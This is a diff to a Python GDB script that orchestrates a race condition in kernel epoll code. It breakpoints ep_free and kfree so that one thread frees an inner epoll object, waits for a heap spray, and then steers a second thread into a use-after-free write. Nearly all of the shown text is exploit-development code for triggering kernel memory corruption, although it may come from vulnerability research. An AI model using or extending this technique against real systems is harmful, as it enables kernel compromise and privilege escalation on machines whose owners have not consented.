@@ -77,17 +77,33 @@ def run_race():
                 break
             else:
                 print(f"[!] Thread B hit ep_free, but with different ep (0x{ep_arg:x}). Continuing...")
-        else:
-            print(f"[!] Stopped, but no thread is at ep_free. Continuing...")
-            
-    # 4. Thread B reached ep_free. Let's make sure it finishes kfree.
+    # Thread B reached ep_free. Make sure it finishes kfree.
     gdb.execute(f"clear *{ep_free_addr}")
     print("[*] Setting breakpoint after kfree")
     gdb.execute(f"break *{kfree_call_addr + 4}")
     gdb.execute("continue")
     gdb.execute(f"clear *{kfree_call_addr + 4}")
     print(f"[*] SUCCESS: Thread B finished kfree(inner_epoll)")
+    
+    print("[*] Waiting 1 second for Thread B to finish heap spray...")
+    import threading
+    import os
+    import signal
+    import time
+    
+    def interrupt_gdb():
+        time.sleep(1.0)
+        os.kill(os.getpid(), signal.SIGINT)
         
+    threading.Thread(target=interrupt_gdb).start()
+    
+    try:
+        gdb.execute("continue")
+    except gdb.error:
+        pass
+        
+    print("[*] Heap spray should be complete.")
+    
     # 5. Restore Thread A's instructions and set its PC back to the cmp instruction
     print(f"[*] Switching back to Thread A ({thread_a})")
     gdb.execute(f"thread {thread_a}")
@@ -127,11 +143,13 @@ def run_race():
             print(f"[*] GDB Error during continue: {e}")
     else:
         print(f"[!] Thread A stopped at {hex(pc)} instead of UAF write")
+        
+    return
 
 try:
     run_race()
 except Exception as e:
     import traceback
     traceback.print_exc()
+    gdb.execute("quit")
 
-gdb.execute("quit")
